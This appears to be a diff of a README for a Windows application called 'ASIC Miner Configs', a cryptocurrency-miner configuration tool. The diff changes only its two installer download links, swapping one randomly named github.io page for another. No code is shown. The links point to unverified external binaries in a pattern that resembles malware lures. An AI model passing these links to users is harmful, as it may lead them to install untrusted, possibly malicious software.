@@ -2,7 +2,7 @@
 
 ASIC Miner Configs is a comprehensive Windows desktop application tailored for cryptocurrency miners who use ASIC hardware. This tool streamlines the configuration, monitoring, and optimization of mining devices from top brands like Bitmain and MicroBT. Developed in 2026, it incorporates the latest features to enhance mining efficiency and hardware longevity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside: Key Features
 
@@ -69,7 +69,7 @@ First, check the physical connections and ensure the miner is powered on. Verify
 
 ## Download
 
-[Get the latest version here](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version here](https://capitals-707-bringing.github.io/download-page/)
 
 ## Disclaimer
 
